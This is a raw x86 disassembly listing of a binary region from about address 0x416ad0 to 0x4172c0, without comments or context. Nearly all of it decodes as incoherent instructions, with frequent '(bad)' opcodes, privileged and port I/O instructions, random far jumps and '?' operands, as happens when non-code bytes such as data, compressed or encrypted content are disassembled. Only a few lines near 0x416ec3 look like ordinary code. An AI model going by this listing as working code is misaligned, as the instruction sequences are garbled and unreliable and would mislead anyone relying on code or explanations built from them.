  416ad0:	push   0x46
  416ad2:	or     BYTE PTR [edx-0x1f9fe207],0x12
  416ad9:	into   
  416ada:	sub    edi,DWORD PTR [edi]
  416adc:	and    DWORD PTR [edx],esi
  416ade:	mov    ds:0x56e20a46,al
  416ae3:	repz ret 0xa205
  416ae7:	data16 (bad) 
  416aea:	(bad)  
  416aed:	mov    ecx,0xb36312b2
  416af2:	test   BYTE PTR [edx],0xcc
  416af5:	popa   
  416af6:	ja     0x416b10
  416af8:	push   ebp
  416af9:	(bad)  
  416afa:	sbb    DWORD PTR [ebx+0x2a],edi
  416afd:	aam    0x32
  416aff:	push   ebx
  416b00:	push   esi
  416b01:	xor    BYTE PTR [esi-0x1f],bh
  416b04:	std    
  416b05:	iret   
  416b06:	mov    eax,ds:0xcfc53881
  416b0b:	in     eax,0x9e
  416b0d:	push   eax
  416b0e:	or     ebp,DWORD PTR [ecx+0x6f2779a6]
  416b14:	inc    edx
  416b15:	mov    fs,WORD PTR [edx-0x6f85bcc6]
  416b1b:	mov    edx,0xddcf5494
  416b20:	and    ebx,0x8ce6d046
  416b26:	adc    bl,dl
  416b28:	scas   al,BYTE PTR es:[edi]
  416b29:	cwde   
  416b2a:	inc    ebp
  416b2b:	pop    edi
  416b2c:	xor    esp,edx
  416b2e:	xchg   DWORD PTR [ebx],eax
  416b30:	stos   BYTE PTR es:[edi],al
  416b31:	push   esi
  416b32:	das    
  416b33:	add    al,0x18
  416b35:	stc    
  416b36:	je     0x416b53
  416b38:	in     al,0xd5
  416b3a:	rcl    DWORD PTR [ebp+0x28],0x2a
  416b3e:	not    DWORD PTR [ecx-0x5a]
  416b41:	or     edx,eax
  416b43:	cmp    al,0x7d
  416b45:	inc    ecx
  416b46:	or     al,BYTE PTR [ebx]
  416b48:	ja     0x416ba3
  416b4a:	stc    
  416b4b:	mov    dh,0x2
  416b4d:	gs mov cl,0x6c
  416b50:	mov    edx,0xe81988df
  416b55:	mov    dh,0x57
  416b57:	ficomp WORD PTR [esi+0x33ecfbb9]
  416b5d:	push   edi
  416b5e:	xlat   BYTE PTR ds:[ebx]
  416b5f:	nop
  416b60:	test   BYTE PTR [ebx+ebx*8+0x61],dl
  416b64:	mov    ax,ds:0x4421d95e
  416b6a:	push   eax
  416b6b:	shr    DWORD PTR [edx+0x53],1
  416b6e:	mov    dl,0x12
  416b70:	push   ds
  416b71:	icebp  
  416b72:	loope  0x416b6d
  416b74:	adc    eax,DWORD PTR [edi-0x1f254801]
  416b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b7b:	hlt    
  416b7c:	dec    esi
  416b7d:	push   eax
  416b7e:	mov    bl,0xab
  416b80:	push   0x3f
  416b82:	test   BYTE PTR [ebp-0x73],0xe8
  416b86:	loopne 0x416b75
  416b88:	retf   0x633c
  416b8b:	jmp    0x416bfa
  416b8d:	inc    esp
  416b8e:	pusha  
  416b8f:	inc    eax
  416b90:	dec    esi
  416b91:	add    bl,dl
  416b93:	cmp    esp,DWORD PTR [ebp-0xf]
  416b96:	(bad)  
  416b97:	pop    ss
  416b98:	jns    0x416bac
  416b9a:	and    eax,0x9a4706f4
  416b9f:	or     cl,0x43
  416ba2:	mov    ebx,0x271479a1
  416ba7:	pop    ebx
  416ba8:	xor    al,0xd
  416baa:	sub    BYTE PTR [esi-0x33a19b0c],ah
  416bb0:	pop    ebp
  416bb1:	xor    esp,edx
  416bb3:	pop    edi
  416bb4:	push   esi
  416bb5:	mov    edx,0x7b468bff
  416bba:	stos   DWORD PTR es:[edi],eax
  416bbb:	xchg   DWORD PTR [edi-0x16b80dc6],ecx
  416bc1:	enter  0x7556,0x7b
  416bc5:	push   0x5520d6d4
  416bca:	ror    BYTE PTR [eax+0x64],0xc1
  416bce:	bound  ebp,QWORD PTR [esi+0x30c138f4]
  416bd4:	gs xor eax,0x2177253f
  416bda:	ins    DWORD PTR es:[edi],dx
  416bdb:	in     al,0x9
  416bdd:	lock jo 0x416c3b
  416be0:	cmp    DWORD PTR [eax+edx*4],ebx
  416be3:	iret   
  416be4:	(bad)  
  416be5:	jmp    0x149e:0x2502f422
  416bec:	mov    ah,0x13
  416bee:	mov    bh,0x2b
  416bf0:	fdivr  DWORD PTR [ecx+ecx*2]
  416bf3:	adc    ch,BYTE PTR [ebx+edx*2+0x79]
  416bf7:	pop    es
  416bf8:	pop    es
  416bf9:	sub    bh,BYTE PTR [ebx]
  416bfb:	enter  0xc2cc,0x6e
  416bff:	popf   
  416c00:	xchg   edi,eax
  416c01:	pop    es
  416c02:	pop    ss
  416c03:	pushf  
  416c04:	cmp    BYTE PTR [ebp+0xa],0xfa
  416c08:	sbb    ch,ch
  416c0a:	out    0x69,al
  416c0c:	mov    ebx,?
  416c0e:	mov    ecx,0xc3f8bec5
  416c13:	mov    dh,0x8a
  416c15:	jb     0x416bae
  416c17:	cli    
  416c18:	(bad)  
  416c19:	scas   eax,DWORD PTR es:[edi]
  416c1a:	mov    bh,0x67
  416c1c:	jmp    0x7ff3:0xa6432f8b
  416c23:	mov    esi,0xafd09096
  416c28:	sbb    eax,0xd1b4b268
  416c2d:	shr    BYTE PTR [edx+edi*1],1
  416c30:	jns    0x416c98
  416c32:	fwait
  416c33:	ret    0xaf4f
  416c36:	pop    es
  416c37:	sub    ebx,edi
  416c39:	pop    es
  416c3a:	inc    ebp
  416c3b:	sti    
  416c3c:	sbb    DWORD PTR ds:0xaeec44c1,esi
  416c42:	xchg   ebx,eax
  416c43:	jns    0x416cb9
  416c45:	mov    ecx,0x1f31724b
  416c4a:	xor    DWORD PTR [ecx+0x27a3eb48],eax
  416c50:	pusha  
  416c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c52:	mov    cl,0xd1
  416c54:	out    dx,al
  416c55:	out    dx,eax
  416c56:	inc    ebp
  416c57:	lahf   
  416c58:	jg     0x416bf8
  416c5a:	out    dx,al
  416c5b:	sub    ah,BYTE PTR [ebx+0x4e2ff7d6]
  416c61:	mov    dh,0x59
  416c63:	(bad)  
  416c64:	arpl   WORD PTR [edi],bx
  416c66:	leave  
  416c67:	scas   eax,DWORD PTR es:[edi]
  416c68:	fwait
  416c69:	push   esi
  416c6a:	and    al,0xd2
  416c6c:	mov    ebp,0x4ff22343
  416c71:	mov    edi,0x597d0da1
  416c76:	sar    BYTE PTR [eax+edi*8-0x4c],cl
  416c7a:	mov    ebx,0x78b754b4
  416c7f:	dec    ebx
  416c80:	lahf   
  416c81:	cld    
  416c82:	jmp    0x3f16fc15
  416c87:	dec    di
  416c89:	or     DWORD PTR [esi-0x6e],esi
  416c8c:	stos   DWORD PTR es:[edi],eax
  416c8d:	mov    al,0xff
  416c8f:	sbb    eax,0x2a6b5388
  416c94:	adc    esi,esp
  416c96:	or     DWORD PTR [ebp+0x24],edi
  416c99:	out    dx,al
  416c9a:	pop    edi
  416c9b:	and    edi,DWORD PTR [ebp-0x17]
  416c9e:	in     eax,dx
  416c9f:	dec    ebx
  416ca0:	xor    DWORD PTR [edi-0x39],0xfffffffc
  416ca4:	or     DWORD PTR [ebp-0x58],ebp
  416ca7:	pushf  
  416ca8:	je     0x416ced
  416caa:	ss pop ds
  416cac:	push   cs
  416cad:	fld    DWORD PTR [eax+edx*8]
  416cb0:	push   es
  416cb1:	jl     0x416cb1
  416cb3:	mov    ah,0x86
  416cb5:	mov    esi,es
  416cb7:	dec    edi
  416cb8:	mov    ds:0xe7025275,al
  416cbd:	pop    ds
  416cbe:	cli    
  416cbf:	fld    st(0)
  416cc1:	and    al,0xa3
  416cc3:	cwde   
  416cc4:	xchg   ebx,eax
  416cc5:	fs cs sahf 
  416cc8:	fcom   st(1)
  416cca:	cmp    BYTE PTR [eax+0x59],bl
  416ccd:	inc    edx
  416cce:	enter  0x91c8,0x67
  416cd2:	cmp    DWORD PTR [esi+0x31fac6b2],ecx
  416cd8:	pop    ds
  416cd9:	xchg   DWORD PTR [esi-0x70bd1a0c],ecx
  416cdf:	pushf  
  416ce0:	cld    
  416ce1:	sahf   
  416ce2:	sub    DWORD PTR [ecx],eax
  416ce4:	rcr    DWORD PTR [ebx],0x5b
  416ce7:	xor    al,0x34
  416ce9:	add    eax,0xaf214563
  416cee:	add    BYTE PTR [esi+0x22],dl
  416cf1:	jae    0x416c83
  416cf3:	xchg   esi,eax
  416cf4:	add    BYTE PTR [ecx],dl
  416cf6:	test   BYTE PTR [esi+esi*1+0x5bf0fd0b],0x51
  416cfe:	outs   dx,DWORD PTR ds:[esi]
  416cff:	or     DWORD PTR [ebp+0x12],0xe8dbab07
  416d06:	push   edi
  416d07:	rcl    BYTE PTR [esi+0x1330a3f7],1
  416d0d:	retf   0xff8e
  416d10:	cdq    
  416d11:	add    edx,DWORD PTR [eax-0x33]
  416d14:	mov    al,ds:0x4dbb9d24
  416d19:	loopne 0x416d2c
  416d1b:	mov    ds:0x3a1b1cf2,al
  416d20:	shl    al,0xb
  416d23:	nop
  416d24:	dec    ebx
  416d25:	inc    eax
  416d26:	xchg   DWORD PTR [ecx-0x30],ecx
  416d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d2a:	test   al,0x26
  416d2c:	lahf   
  416d2d:	mov    DWORD PTR [eax],edi
  416d2f:	xor    esi,0x13
  416d32:	dec    eax
  416d33:	jo     0x416d3c
  416d35:	pop    es
  416d36:	push   edi
  416d37:	adc    eax,0x69dbc901
  416d3c:	shl    DWORD PTR [ebx],cl
  416d3e:	rcl    DWORD PTR [esi+0x7f],0xf3
  416d42:	xor    al,0xe9
  416d44:	pop    edi
  416d45:	aad    0xda
  416d47:	stc    
  416d48:	or     edx,DWORD PTR ds:0x54b34a7e
  416d4e:	mov    dl,0x2b
  416d50:	ds pushf 
  416d52:	inc    edx
  416d53:	test   cl,bl
  416d55:	cmp    eax,0x344b1b
  416d5a:	xor    edi,DWORD PTR ds:0xc242d86d
  416d60:	add    al,0x6
  416d62:	retf   0xaeaa
  416d65:	and    bl,BYTE PTR [ebp+0x59]
  416d68:	jle    0x416dad
  416d6a:	jae    0x416d8f
  416d6c:	sbb    edi,DWORD PTR ds:[edx]
  416d6f:	and    DWORD PTR [ecx+0x646baabb],0xda8d4f59
  416d79:	pop    es
  416d7a:	mov    ebp,0x34969863
  416d7f:	inc    ebx
  416d80:	ret    
  416d81:	test   al,0xe7
  416d83:	cmp    esp,ebp
  416d85:	lods   eax,DWORD PTR ds:[esi]
  416d86:	inc    edx
  416d87:	pop    ecx
  416d88:	add    eax,0x47daf2fc
  416d8d:	mov    al,ds:0xfcf965af
  416d92:	mov    ds:0xe0488192,al
  416d97:	xlat   BYTE PTR ds:[ebx]
  416d98:	imul   eax,eax,0x5eee3b7e
  416d9e:	inc    ebx
  416d9f:	cmp    DWORD PTR [edx-0x494a12be],edi
  416da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416da6:	cmp    eax,0x7edd898c
  416dab:	or     esi,DWORD PTR [esi+0x28]
  416dae:	adc    ebx,esi
  416db0:	push   edx
  416db1:	or     al,0x53
  416db3:	jbe    0x416ddf
  416db5:	push   esi
  416db6:	out    0x32,al
  416db8:	add    dh,dh
  416dba:	push   eax
  416dbb:	mov    DWORD PTR [ebp+0x53],esi
  416dbe:	mov    edx,0xc5b943e5
  416dc3:	das    
  416dc4:	pop    esp
  416dc5:	xor    ebx,edi
  416dc7:	pop    ebp
  416dc8:	jbe    0x416e1d
  416dca:	(bad)  
  416dcc:	or     al,0xe6
  416dce:	push   0x5ed8b39e
  416dd3:	in     al,dx
  416dd4:	mov    WORD PTR [edx+0x479e562a],ds
  416dda:	loope  0x416d9c
  416ddc:	push   esi
  416ddd:	aam    0x8d
  416ddf:	jecxz  0x416d73
  416de1:	aaa    
  416de2:	jmp    0xbeb5f05f
  416de7:	push   ss
  416de8:	push   ss
  416de9:	push   ecx
  416dea:	ds cmp al,0x2f
  416ded:	ds or  eax,0x5fa5d4ba
  416df3:	jmp    0x3e2f0030
  416df8:	shl    BYTE PTR [edx],cl
  416dfa:	stos   BYTE PTR es:[edi],al
  416dfb:	dec    esi
  416dfc:	jp     0x416e01
  416dfe:	dec    esi
  416dff:	test   al,0xf8
  416e01:	std    
  416e02:	cmp    dl,0xab
  416e05:	sbb    cl,BYTE PTR [ebx]
  416e07:	mov    bh,0xe8
  416e09:	stc    
  416e0a:	dec    esi
  416e0b:	push   esi
  416e0c:	loope  0x416de5
  416e0e:	pop    ds
  416e0f:	(bad)  
  416e10:	cmp    ecx,DWORD PTR [edx+0x39c719b7]
  416e16:	ds call 0xc39:0x319e3105
  416e1e:	lock cmp esp,edx
  416e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e22:	outs   dx,DWORD PTR ds:[esi]
  416e23:	(bad)  
  416e24:	sub    eax,ebp
  416e26:	sub    dh,bl
  416e28:	add    BYTE PTR [edx],bl
  416e2a:	push   0x2e
  416e2c:	sbb    edi,DWORD PTR es:[edi-0x5e280ed7]
  416e33:	lds    esp,FWORD PTR ds:0x8ca91da0
  416e39:	or     ebp,esp
  416e3b:	push   0x5d
  416e3d:	shl    DWORD PTR [ecx+0x5b0a8a21],cl
  416e43:	pop    ss
  416e44:	sbb    edx,edx
  416e46:	sub    BYTE PTR [eax-0x63b64035],dl
  416e4c:	adc    al,0xdf
  416e4e:	mov    al,0x5f
  416e50:	fild   QWORD PTR [edi+0x58]
  416e53:	loope  0x416e12
  416e55:	add    bh,BYTE PTR [esi+esi*2-0x1f70791e]
  416e5c:	push   ebp
  416e5d:	pop    edi
  416e5e:	xchg   edi,eax
  416e5f:	mov    cl,0xc8
  416e61:	dec    ebp
  416e62:	int    0x37
  416e64:	jne    0x416e28
  416e66:	std    
  416e67:	popa   
  416e68:	sub    al,0xa6
  416e6a:	xor    al,0x1b
  416e6c:	shl    DWORD PTR [ebp+0x40],0x29
  416e70:	push   esp
  416e71:	jmp    0x416e7b
  416e73:	and    cl,BYTE PTR [edi-0x2d]
  416e76:	sbb    DWORD PTR ds:0x6b6866d,0x7f
  416e7d:	fmul   st,st(0)
  416e7f:	push   es
  416e80:	imul   ebx,DWORD PTR [eax+0x7637293],0x450addc9
  416e8a:	psubusw mm2,QWORD PTR [ebx]
  416e8d:	and    ebx,DWORD PTR [edi-0x3376fdea]
  416e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e94:	addr16 or ah,0x45
  416e98:	xor    eax,0x8f4d085e
  416e9d:	cmp    ecx,DWORD PTR [edi+0x4ce6953b]
  416ea3:	pop    es
  416ea4:	fnstcw WORD PTR [esi+ebp*8-0x6a]
  416ea8:	enter  0x1307,0x44
  416eac:	push   esi
  416ead:	mov    ds:0x957335f5,eax
  416eb2:	imul   edi,DWORD PTR [edx-0x53f035cd],0x450b02c8
  416ebc:	adc    cl,al
  416ebe:	jmp    0x886f7c5
  416ec3:	mov    eax,ecx
  416ec5:	or     eax,DWORD PTR [ebp+0x14]
  416ec8:	mov    ecx,DWORD PTR [ebx]
  416eca:	mov    edx,DWORD PTR [ebx+0x4]
  416ecd:	push   eax
  416ece:	push   DWORD PTR [ebp+0x8]
  416ed1:	jmp    0x41745b
  416ed6:	aaa    
  416ed7:	or     bl,BYTE PTR [ebp+0x2e982194]
  416edd:	js     0x416f43
  416edf:	stc    
  416ee0:	sub    al,0xb4
  416ee2:	pop    edi
  416ee3:	push   ecx
  416ee4:	mov    al,0xae
  416ee6:	mov    cl,0x99
  416ee8:	or     al,0x16
  416eea:	cmp    eax,0x38161604
  416eef:	lock shr DWORD PTR ds:0x1f3c2663,0xaa
  416ef7:	xchg   ebp,eax
  416ef8:	clc    
  416ef9:	cld    
  416efa:	dec    esi
  416efb:	jne    0x416f5f
  416efd:	or     edx,0xffffff99
  416f00:	mov    ch,0x86
  416f02:	mul    DWORD PTR [eax+0x72]
  416f05:	mov    cl,0xdd
  416f07:	inc    esp
  416f08:	mov    ds:0x6e3c7e55,eax
  416f0d:	fadd   QWORD PTR [edi-0x28b69cef]
  416f13:	ds push ds
  416f15:	dec    DWORD PTR es:[ebx+esi*8-0x55]
  416f1a:	push   0xffffffa9
  416f1c:	inc    esi
  416f1d:	aaa    
  416f1e:	xchg   edx,eax
  416f1f:	into   
  416f20:	ja     0x416f5f
  416f22:	adc    al,0x84
  416f24:	mov    ds:0xbfc2bddb,eax
  416f29:	lds    ebp,FWORD PTR [ebx+ebp*4-0x38]
  416f2d:	mov    edx,DWORD PTR [edx-0x23f39cba]
  416f33:	(bad)  
  416f34:	pop    ebp
  416f35:	stc    
  416f36:	es adc al,0x1e
  416f39:	lods   eax,DWORD PTR ds:[esi]
  416f3a:	hlt    
  416f3b:	into   
  416f3c:	mov    eax,0xfd9010fd
  416f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f42:	int3   
  416f43:	adc    edi,DWORD PTR [ebx]
  416f45:	mov    ds:0x5ce7b81c,al
  416f4a:	sub    bl,0xff
  416f4d:	and    dl,0x99
  416f50:	add    eax,0x75f4bd3e
  416f55:	lea    ebx,[eax]
  416f57:	arpl   dx,si
  416f59:	arpl   si,dx
  416f5b:	aam    0x95
  416f5d:	adc    al,0xc2
  416f5f:	mov    ss,esi
  416f61:	out    dx,eax
  416f62:	ja     0x416f89
  416f64:	mov    dl,0x17
  416f66:	pusha  
  416f67:	add    DWORD PTR [ebx],0x944f9f70
  416f6d:	in     al,0x64
  416f6f:	dec    eax
  416f70:	aad    0xc8
  416f72:	jg     0x416f00
  416f74:	hlt    
  416f75:	xchg   BYTE PTR [ebx-0x7b7ad9e6],cl
  416f7b:	pop    ebx
  416f7c:	sub    BYTE PTR [esi-0x4816051a],ch
  416f82:	sbb    BYTE PTR [ecx+0x10b0fd95],0xd7
  416f89:	sbb    BYTE PTR [edi],bl
  416f8b:	(bad)  
  416f8d:	or     DWORD PTR [ebx],0x8d8b4f34
  416f93:	rcr    BYTE PTR [edi+0x57],1
  416f96:	fistp  DWORD PTR [edi]
  416f98:	sub    eax,0x1ca0444c
  416f9d:	enter  0xbd5,0x73
  416fa1:	ds mov ebx,0x667fa7d4
  416fa7:	push   cs
  416fa8:	lahf   
  416fa9:	(bad)  
  416faa:	pop    eax
  416fab:	pop    edi
  416fac:	dec    esp
  416fad:	hlt    
  416fae:	or     eax,0xe3db55b7
  416fb3:	repz hlt 
  416fb5:	mov    edx,0xf6783a73
  416fba:	push   ebp
  416fbb:	mov    ah,0x6c
  416fbd:	cs in  al,0xc6
  416fc0:	das    
  416fc1:	or     al,0xba
  416fc3:	lods   al,BYTE PTR ds:[esi]
  416fc4:	and    cl,BYTE PTR [ebx-0x2910f7f0]
  416fca:	dec    ecx
  416fcb:	or     al,0x45
  416fcd:	or     BYTE PTR [ebx+0x20bd38d5],al
  416fd3:	push   esi
  416fd4:	iret   
  416fd5:	adc    ebx,DWORD PTR [edi-0x5c]
  416fd8:	sbb    eax,0x350c08be
  416fdd:	push   ebx
  416fde:	pop    ss
  416fdf:	nop
  416fe0:	mov    ah,0xe2
  416fe2:	std    
  416fe3:	test   eax,0x6650c272
  416fe8:	hlt    
  416fe9:	mov    ecx,0xbe523df9
  416fee:	iret   
  416fef:	jb     0x416fa1
  416ff1:	xchg   esi,eax
  416ff2:	loope  0x417024
  416ff4:	xchg   ebx,eax
  416ff5:	mov    cs,WORD PTR [edx+0x61]
  416ff8:	jge    0x416fe6
  416ffa:	xor    esp,DWORD PTR gs:[edx]
  416ffd:	push   ds
  416ffe:	xchg   ecx,eax
  416fff:	ror    DWORD PTR ds:0xf933de05,0xfd
  417006:	sbb    eax,0x3d5dec63
  41700b:	dec    edx
  41700c:	add    esp,esi
  41700e:	cmp    bh,BYTE PTR [eax+eax*2-0x79]
  417012:	(bad)  
  417013:	xchg   esi,eax
  417014:	cld    
  417015:	jmp    0x417049
  417017:	rcr    DWORD PTR [ebx],cl
  417019:	pop    ecx
  41701a:	cwde   
  41701b:	inc    eax
  41701c:	leave  
  41701d:	(bad)  
  41701e:	loopne 0x417017
  417020:	fisttp QWORD PTR [esi+0x73405d42]
  417026:	xchg   edx,eax
  417027:	sub    DWORD PTR [esi+eax*4],0xffffffb2
  41702b:	ror    BYTE PTR [ecx+0x4d],0xae
  41702f:	xchg   dx,ax
  417031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417032:	jg     0x4170ab
  417034:	jp     0x417098
  417036:	cwde   
  417037:	rcl    BYTE PTR [edi+0x23],cl
  41703a:	iret   
  41703b:	aam    0x77
  41703d:	sbb    edi,DWORD PTR [edi+0xd]
  417040:	xchg   edi,eax
  417041:	mov    al,ds:0xfdf02232
  417046:	scas   al,BYTE PTR es:[edi]
  417047:	xor    BYTE PTR [ecx-0x4d5e6ca8],bl
  41704d:	jo     0x4170c8
  41704f:	push   edx
  417050:	js     0x417015
  417052:	jne    0x41704b
  417054:	pop    esi
  417055:	stos   BYTE PTR es:[edi],al
  417056:	jecxz  0x417032
  417058:	xor    BYTE PTR [edx-0x1a8641e0],dl
  41705e:	push   cs
  41705f:	stos   BYTE PTR es:[edi],al
  417060:	mov    dh,0x30
  417062:	xchg   ebp,eax
  417063:	popf   
  417064:	fdiv   st,st(1)
  417066:	in     al,dx
  417067:	fld    TBYTE PTR [ebx+0x6e90f481]
  41706d:	xchg   edi,eax
  41706e:	outs   dx,DWORD PTR ds:[esi]
  41706f:	jge    0x4170ed
  417071:	bound  esi,QWORD PTR [esi-0x48]
  417074:	dec    ecx
  417075:	mov    dl,0x61
  417077:	sub    al,0x9d
  417079:	bound  esi,QWORD PTR [esi+0x36]
  41707c:	call   0x95c:0x8d44ed6a
  417083:	cmp    al,0x52
  417085:	ret    0x4b3a
  417088:	jns    0x417100
  41708a:	jl     0x417090
  41708c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41708d:	jg     0x41707d
  41708f:	cmp    bl,BYTE PTR [ebx]
  417091:	test   ecx,eax
  417093:	mov    al,BYTE PTR [ebx]
  417095:	scas   eax,DWORD PTR es:[edi]
  417096:	mov    al,0x8
  417098:	pushf  
  417099:	mov    BYTE PTR [esi-0x11],cl
  41709c:	shr    DWORD PTR [edx],cl
  41709e:	outs   dx,DWORD PTR ds:[esi]
  41709f:	loopne 0x41708d
  4170a1:	mov    eax,0x3fb52e07
  4170a6:	repnz sti 
  4170a8:	les    esp,FWORD PTR [bp-0x2e]
  4170ac:	test   al,0xe9
  4170ae:	push   ecx
  4170af:	push   edx
  4170b0:	xor    eax,0x77843322
  4170b5:	adc    DWORD PTR ds:[ebx+0x6c2e2d02],ecx
  4170bc:	add    DWORD PTR [ebx-0x4d0250c0],esp
  4170c2:	xchg   ebp,eax
  4170c3:	cmp    bl,BYTE PTR cs:[eax]
  4170c6:	fsubr  st(6),st
  4170c8:	sub    al,0x2b
  4170ca:	xor    BYTE PTR [ebx+edi*8],al
  4170cd:	sub    BYTE PTR [edi],dh
  4170cf:	dec    eax
  4170d0:	sahf   
  4170d1:	outs   dx,BYTE PTR ds:[esi]
  4170d2:	cmp    bl,BYTE PTR [ecx-0x1c7f404f]
  4170d8:	xchg   edi,eax
  4170d9:	iret   
  4170da:	in     eax,dx
  4170db:	cwde   
  4170dc:	xchg   ecx,eax
  4170dd:	mov    ds:0xf199e3a2,al
  4170e2:	sub    ch,BYTE PTR [edx+eiz*4-0x499e7957]
  4170e9:	adc    eax,0xe59b9426
  4170ee:	idiv   BYTE PTR [ecx+0x5cc52262]
  4170f4:	add    edx,eax
  4170f6:	retf   0x1981
  4170f9:	leave  
  4170fa:	adc    ebx,DWORD PTR [esi+edx*8+0xc]
  4170fe:	cdq    
  4170ff:	mov    edi,0x94c8a98
  417104:	mov    edi,0x5e2ee579
  417109:	jmp    0x1257eccd
  41710e:	dec    esi
  41710f:	push   0x29
  417111:	dec    ecx
  417112:	push   esi
  417113:	dec    eax
  417114:	dec    esp
  417115:	ja     0x4170bc
  417117:	inc    esp
  417118:	mov    eax,ds:0xf1a39dad
  41711d:	mov    dl,0x14
  41711f:	xchg   ebx,eax
  417120:	dec    edx
  417121:	stos   BYTE PTR es:[edi],al
  417122:	xchg   ebp,eax
  417123:	inc    ebp
  417124:	adc    DWORD PTR [esi],ebp
  417126:	jno    0x417140
  417128:	(bad)  
  417129:	cmp    al,0x74
  41712b:	arpl   di,si
  41712d:	out    dx,al
  41712e:	adc    dl,BYTE PTR ss:[esi+ecx*1+0x1623b60f]
  417136:	mov    ds:0xbbc556d6,eax
  41713b:	jae    0x41710f
  41713d:	pop    esp
  41713e:	xchg   BYTE PTR [ecx+0x9092e91],ah
  417144:	addr16 xchg edi,eax
  417146:	popa   
  417147:	mov    WORD PTR [edx],?
  417149:	sahf   
  41714a:	sbb    al,BYTE PTR [edx+edx*4]
  41714d:	mov    edi,0x68a92c10
  417152:	jmp    0x6b345f4
  417157:	push   eax
  417158:	inc    edi
  417159:	sub    al,BYTE PTR [ebx-0x6be19c59]
  41715f:	pop    ds
  417160:	push   ebp
  417161:	jbe    0x4171b2
  417163:	iret   
  417164:	mov    edx,0x27a3ff15
  417169:	imul   ecx,DWORD PTR [ebx-0x29],0x65533817
  417170:	jmp    0x4819:0xb35d30ca
  417177:	push   cs
  417178:	das    
  417179:	adc    DWORD PTR [ecx-0x3a],0x7d15b546
  417180:	cmp    esi,DWORD PTR [ebx+edi*1]
  417183:	jb     0x4171f9
  417185:	xchg   esi,eax
  417186:	xor    DWORD PTR [ebp-0x3b],esp
  417189:	adc    ebp,DWORD PTR [edx+edx*8]
  41718c:	imul   ebp,esp,0x4cdfb83a
  417192:	jo     0x4171e6
  417194:	mul    DWORD PTR [esi+edx*4]
  417197:	sbb    edx,ebp
  417199:	inc    ebx
  41719a:	xchg   edx,eax
  41719b:	xor    eax,0x5a851c9f
  4171a0:	in     eax,0x59
  4171a2:	or     al,0x3c
  4171a4:	ffreep st(4)
  4171a6:	or     BYTE PTR gs:[ebx+0x14019f5c],al
  4171ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171ae:	arpl   WORD PTR ds:[esi+0x1d],ax
  4171b2:	scas   al,BYTE PTR es:[edi]
  4171b3:	retf   0x98a9
  4171b6:	ror    BYTE PTR [edx-0x1a2fe005],cl
  4171bc:	dec    edx
  4171bd:	in     eax,0x6b
  4171bf:	mov    esp,0x3711e8c6
  4171c4:	cmp    cl,BYTE PTR [ecx-0x660b066b]
  4171ca:	int3   
  4171cb:	mov    al,ds:0x95baec6c
  4171d0:	adc    DWORD PTR [ecx-0x52839197],ebx
  4171d6:	or     dl,BYTE PTR [ecx+0x74]
  4171d9:	enter  0xb0fe,0x37
  4171dd:	dec    eax
  4171de:	pop    ebp
  4171df:	mov    ds:0xb5ee82d,eax
  4171e4:	popf   
  4171e5:	sub    al,0x7c
  4171e7:	retf   0xd892
  4171ea:	loopne 0x417240
  4171ec:	jmp    0x15a5e1fe
  4171f1:	sbb    eax,0x1291da25
  4171f6:	adc    BYTE PTR [ecx+0x3f],al
  4171f9:	adc    eax,DWORD PTR [ebp-0x6a]
  4171fc:	dec    esp
  4171fd:	popf   
  4171fe:	jl     0x417246
  417200:	dec    ecx
  417201:	clc    
  417202:	lock add bh,BYTE PTR [ecx+0xeeb16f8]
  417209:	push   eax
  41720a:	(bad)  
  41720b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41720c:	sbb    BYTE PTR [ebx+0x4bbb4f9],cl
  417212:	inc    ebp
  417213:	loopne 0x41721a
  417215:	aad    0x62
  417217:	and    BYTE PTR [ecx+0x6d4c1fed],al
  41721d:	pop    edi
  41721e:	mov    al,ds:0x957926bb
  417223:	sub    esi,esp
  417225:	xor    al,0x64
  417227:	inc    eax
  417228:	arpl   WORD PTR [ecx-0x42],si
  41722b:	idiv   DWORD PTR [ebx+0x2c]
  41722e:	es jo  0x417230
  417231:	jmp    0x2348:0x3e5196ad
  417238:	and    dh,bh
  41723a:	call   0x8572:0xeda6e022
  417241:	inc    edx
  417242:	mov    ah,BYTE PTR [edi-0x3d8f2b18]
  417248:	mov    DWORD PTR [esi-0x55e9a68c],esp
  41724e:	mov    dh,0x73
  417250:	cwde   
  417251:	fcomp  DWORD PTR [esi+0x3f6c5b45]
  417258:	xchg   DWORD PTR [ecx-0x6a],edi
  41725b:	iret   
  41725c:	and    BYTE PTR [ebx+0x7a],ch
  41725f:	mov    ecx,0x3edf54b4
  417264:	pushf  
  417265:	in     al,dx
  417266:	lods   al,BYTE PTR ds:[esi]
  417267:	call   0x27d44f59
  41726c:	aam    0x45
  41726e:	or     DWORD PTR [eax+0x4d],esp
  417271:	add    esp,DWORD PTR [edx]
  417273:	dec    eax
  417274:	push   esi
  417275:	or     al,BYTE PTR [ebx+eiz*4+0x75]
  417279:	inc    ebx
  41727a:	mov    al,ds:0x45012667
  41727f:	mov    esp,0x9e0b4079
  417284:	(bad)  
  417285:	jmp    0x32d605f0
  41728a:	jmp    0xc507cf65
  41728f:	sbb    al,0x15
  417291:	pop    sp
  417293:	mov    DWORD PTR [edx+0x5a],esi
  417296:	sub    al,BYTE PTR [edx-0x3f]
  417299:	inc    esi
  41729a:	and    al,BYTE PTR [ebx-0x77]
  41729d:	add    dh,BYTE PTR [ebx-0xb]
  4172a0:	xchg   DWORD PTR [ebp+0x633d50b],esi
  4172a6:	cli    
  4172a7:	xchg   edi,eax
  4172a8:	add    BYTE PTR [ecx-0x2f],bh
  4172ab:	cmp    al,0x75
  4172ad:	mov    ss,WORD PTR [esi+0x9]
  4172b0:	mov    ds:0xdda36a67,al
  4172b5:	dec    esi
  4172b6:	inc    edi
  4172b7:	push   ds
  4172b8:	test   al,0xc3
  4172ba:	fild   WORD PTR [ebp+0x73ca52b9]
  4172c0:	cmp    DWORD PTR [eax-0x3b],ecx
